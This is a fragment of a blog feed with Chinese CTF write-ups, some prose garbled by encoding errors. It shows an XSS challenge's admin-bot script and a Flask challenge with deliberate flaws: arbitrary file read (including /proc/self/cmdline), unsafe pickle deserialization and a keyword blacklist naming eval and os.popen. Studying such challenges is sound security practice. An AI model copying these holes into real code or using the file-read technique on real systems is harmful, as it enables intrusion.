id <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">;</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File not found.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>adminbot_test.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// npm i puppeteer</span><span class="token comment">// script to emulate admin bot</span><span class="token keyword">const</span> puppeteer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"puppeteer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">FLAG</span> <span class="token operator">=</span> <span class="token string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">SITE</span> <span class="token operator">=</span> <span class="token string">"https://htmlsandbox.chals.sekai.team"</span><span class="token punctuation">;</span><span class="token keyword">const</span> target <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">headless</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">pipe</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            <span class="token literal-property property">args</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"--no-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--disable-setuid-sandbox"</span><span class="token punctuation">,</span>                <span class="token string">"--js-flags=--noexpose_wasm,--jitless"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token literal-property property">dumpio</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token constant">SITE</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">'domcontentloaded'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://'</span><span class="token punctuation">)</span> <span class="token operator">||</span> target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤æœ‰ç‚¹çˆ†ç‚¸äº†ï¼Œæ­‡ä¸€ä¼šå†çœ‹ï¼ˆ</p><p>è²Œä¼¼æ˜¯å­—ç¬¦é›†ç»•è¿‡</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;xssé¢†åŸŸå¤§ç¥å•Š&lt;/p&gt;
&lt;p&gt;ä½ è¯´å¾—å¯¹ï¼Œä½†ä»Šå¤©æ˜¯å“ˆèŒ¨æ¶…ç±³åº“å¥³å£«çš„ç”Ÿæ—¥ï¼Œè½¬å‘è¿™æ¡æ¶ˆæ¯åˆ°äº”ä¸ªç¾¤ï¼Œä¸­é—´å¿˜äº†ï¼Œåæ­£ä¼šè¢«éª‚ä¸€é¡¿ï¼Œä½†ä»Šå¤©çœŸçš„æ˜¯å“ˆèŒ¨æ¶…ç±³åº“å¥³å£«çš„ç”Ÿæ—¥&lt;/p&gt;
&lt;p&gt;äº‹å·²è‡³æ­¤ï¼Œå…ˆæ‰“ä¼špjskå§ï¼ˆ&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/08/31/SekaiCTF2024%E5%A4%8D%E7%8E%B0/image-20240831223757429.png&quot; alt=&quot;image-20240831223757429&quot;&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;utm_medium=rec#WEB&quot;&gt;https://hackmd.io/@Whale120/HJ_rpvujC?utm_source=preview-mode&amp;amp;utm_medium=rec#WEB&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/&quot;&gt;https://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.ankursundara.com/htmlsandbox-writeup/amp/&quot;&gt;https://blog.ankursundara.com/htmlsandbox-writeup/amp/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/</id>
    <published>2024-08-27T00:50:26.000Z</published>
    <updated>2024-08-31T05:50:03.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g">https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g</a></p><span id="more"></span><hr><h1 id="I-have-wrote-some-lyrics-for-youâ€¦â€¦"><a href="#I-have-wrote-some-lyrics-for-youâ€¦â€¦" class="headerlink" title="I have wrote some lyrics for youâ€¦â€¦"></a>I have wrote some lyrics for youâ€¦â€¦</h1><p>è¿›å»æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š<code>/lyrics?lyrics=</code></p><p>å…ˆè¯» &#x2F;proc&#x2F;self&#x2F;cmdline ï¼šå¾—åˆ°è¿è¡Œè·¯å¾„<code>python3 -u /usr/etc/app/app.py</code></p><p>è¯»ä¸‹æ¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> random<span class="token keyword">from</span> config<span class="token punctuation">.</span>secret_key <span class="token keyword">import</span> secret_code<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token keyword">from</span> cookie <span class="token keyword">import</span> set_cookie<span class="token punctuation">,</span> cookie_check<span class="token punctuation">,</span> get_cookie<span class="token keyword">import</span> pickleapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> random<span class="token punctuation">.</span>randbytes<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UserData</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token keyword">def</span> <span class="token function">Waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/lyrics"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain; charset=UTF-8'</span>    query <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"lyrics"</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/lyrics"</span><span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            res <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No lyrics found"</span>    <span class="token keyword">return</span> res<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        user <span class="token operator">=</span> UserData<span class="token punctuation">(</span>username<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> set_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> res<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/board"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">board</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid <span class="token operator">=</span> cookie_check<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> invalid<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Nope, invalid code get out!"</span>    data <span class="token operator">=</span> get_cookie<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> secret<span class="token operator">=</span>secret_code<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> name<span class="token operator">=</span>data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€»è¾‘å¾ˆæ¸…æ™°ï¼Œå…ˆç™»å½•ï¼Œç„¶åæ˜¯pickleååºåˆ—åŒ–</p><p>æŠŠç›¸å…³çš„æ¨¡å—ä¹Ÿè¯»å‡ºæ¥</p><p>&#x2F;usr&#x2F;etc&#x2F;app&#x2F;cookie.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> hmac<span class="token keyword">import</span> pickle<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span> request<span class="token builtin">unicode</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token builtin">basestring</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token comment"># Quoted from python bottle template, thanks :D</span><span class="token keyword">def</span> <span class="token function">cookie_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> tob<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token operator">+</span> sig <span class="token operator">+</span> tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span> <span class="token operator">+</span> msg<span class="token keyword">def</span> <span class="token function">cookie_decode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'secret'</span><span class="token punctuation">,</span> <span class="token string">b'eval'</span><span class="token punctuation">,</span> <span class="token string">b'file'</span><span class="token punctuation">,</span> <span class="token string">b'compile'</span><span class="token punctuation">,</span> <span class="token string">b'open'</span><span class="token punctuation">,</span> <span class="token string">b'os.popen'</span><span class="token punctuation">]</span>    valid <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> word <span class="token keyword">in</span> data<span class="token punctuation">:</span>            valid <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment"># print(word)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> valid<span class="token keyword">def</span> <span class="token function">cookie_check</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> secret<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    data <span class="token operator">=</span> tob<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">:</span>        <span class="token keyword">if</span> cookie_is_encoded<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            sig<span class="token punctuation">,</span> msg <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>tob<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> _lscmp<span class="token punctuation">(</span>sig<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span>tob<span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> digestmod<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>                <span class="token keyword">if</span> waf<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token boolean">True</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token 